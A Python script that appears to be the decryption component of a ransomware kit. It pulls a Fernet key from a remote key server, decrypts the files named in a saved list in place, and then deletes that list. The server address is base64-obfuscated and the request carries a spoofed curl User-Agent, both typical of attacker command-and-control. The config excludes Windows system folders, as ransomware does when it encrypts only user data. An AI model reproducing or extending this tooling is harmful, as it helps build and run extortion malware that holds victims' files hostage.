import os
import sys
import logging
import requests
import base64
from cryptography.fernet import Fernet, InvalidToken

# CONFIGURATION
LOG_FILE = "decryption.log"
ENCRYPTED_LIST_FILE = "encrypted_files.txt"
SYSTEM_CRITICAL_PATHS = [
    "C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)"
]
MAX_FILE_SIZE = 629145600  # 600MB

# Setup logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# --------------------------- KEY RETRIEVAL ---------------------------
def decode_url(encoded):
    return base64.b64decode(encoded).decode()

def get_key():
    try:
        # Base64-encoded version of: http://192.168.145.218:5000/get_key?token=my_secret_token
        encoded_url = "aHR0cDovLzE5Mi4xNjguMTQ1LjIxODo1MDAwL2dldF9rZXk/dG9rZW49bXlfc2VjcmV0X3Rva2Vu"
        url = decode_url(encoded_url)

        headers = {
            "User-Agent": "curl/7.81.0"
        }

        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            return response.json()['key'].encode()
        else:
            logging.error(f"Key server returned non-200 status: {response.status_code}")
            return None
    except Exception as e:
        logging.error(f"Failed to retrieve key: {e}")
        return None

# --------------------------- DECRYPTION LOGIC ---------------------------
def is_fernet_encrypted(file_path, cipher):
    try:
        with open(file_path, "rb") as f:
            sample = f.read(128)
        cipher.decrypt(sample)
        return True
    except InvalidToken:
        return False
    except Exception as e:
        logging.warning(f"Error checking encryption status for {file_path}: {e}")
        return False

def decrypt_file(file_path, cipher):
    try:
        if os.path.getsize(file_path) > MAX_FILE_SIZE:
            logging.info(f"Skipped large file: {file_path}")
            return False

        with open(file_path, "rb") as f:
            data = f.read()

        decrypted_data = cipher.decrypt(data)
        with open(file_path, "wb") as f:
            f.write(decrypted_data)

        logging.info(f"Decrypted: {file_path}")
        return True

    except InvalidToken:
        logging.info(f"Skipped not-encrypted file (Invalid token): {file_path}")
        return False
    except PermissionError:
        logging.warning(f"Permission denied for file: {file_path}")
        return False
    except Exception as e:
        logging.error(f"Error decrypting {file_path}: {e}")
        return False


def decrypt_from_list(cipher, list_file=ENCRYPTED_LIST_FILE):
    if not os.path.exists(list_file):
        print(f"❌ Encrypted file list not found: {list_file}")
        logging.error(f"Encrypted file list not found: {list_file}")
        return

    total_files = 0
    decrypted_files = 0

    with open(list_file, "r") as f:
        paths = [line.strip() for line in f.readlines() if line.strip()]

    for file_path in paths:
        if not os.path.exists(file_path):
            logging.warning(f"File not found (skipped): {file_path}")
            continue

        if os.path.getsize(file_path) > MAX_FILE_SIZE:
            logging.info(f"Skipped large file: {file_path}")
            continue

        total_files += 1
        if decrypt_file(file_path, cipher):
            decrypted_files += 1
    logging.info(f"Decryption complete! {decrypted_files}/{total_files} files decrypted.")
    print(f"Decryption complete! {decrypted_files}/{total_files} files decrypted.")

# --------------------------- MAIN ---------------------------
if __name__ == "__main__":
    encryption_key = get_key()
    if not encryption_key:
        print("❌ Failed to retrieve Fernet key. Exiting.")
        sys.exit(1)

    try:
        cipher = Fernet(encryption_key)
    except Exception as e:
        logging.error(f"Cipher initialization failed: {e}")
        print("❌ Invalid Fernet key. Exiting.")
        sys.exit(1)

    root_directory = os.path.abspath(os.sep)
    decrypt_from_list(cipher)

    # ✅ Only after decryption is complete
    try:
        with open("decryption_success.lock", "w") as lock:
            lock.write("decryption completed")
        logging.info("✅ Decryption lock file created.")

        if os.path.exists(ENCRYPTED_LIST_FILE):
            os.remove(ENCRYPTED_LIST_FILE)
            logging.info(f"Deleted encrypted list: {ENCRYPTED_LIST_FILE}")
    except Exception as e:
        logging.warning(f"Post-decryption cleanup failed: {e}")


